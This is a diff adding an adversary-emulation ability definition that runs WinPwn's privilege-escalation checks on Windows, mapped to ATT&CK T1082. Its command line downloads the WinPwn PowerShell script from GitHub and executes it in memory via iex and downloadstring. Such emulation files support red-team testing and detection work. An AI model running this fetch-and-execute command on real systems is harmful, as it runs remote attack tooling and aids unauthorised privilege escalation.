@@ -1,0 +1,17 @@
+- description: General privesc checks using the otherchecks function of WinPwn
+  id: 5e461133-5db4-d646-0a88-a78fd0fde3ae
+  name: WinPwn - General privesc checks
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          otherchecks -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
